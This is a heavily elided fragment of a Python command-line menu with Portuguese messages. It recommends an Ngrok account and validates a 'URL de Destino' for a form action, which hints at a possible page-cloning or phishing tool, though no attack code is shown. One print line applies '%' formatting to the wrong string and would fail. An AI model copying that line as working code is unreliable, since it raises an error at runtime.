...
def menu_program(): #Menu do Programa
  ...
  if (verificar_termos == True):
    ...
    print ("\n" + W + "[" + G + "ATENCAO" + W + "]" + C + " Recomendo criar uma conta Ngrok e autentica-la para utilizar esse programa sem que ocorra bugs.")
         ...
         try: #Se o usuário digitar show ou show options na posição 0 ou 1 da lista, será exibida a tela de configuração
          ...
          try:
            ...
            if (verificar_action == True):
              ...
              print ("\n" + W + "[" + R + "-" + W + "]" + C + " A URL de Destino %s é inválida. Use de exemplo: " + G + "https://www.site.com" %url_action)
              url_action = "Sem URL de Destino ativa"
              time.sleep(4.5)
              banner_program()
              continue
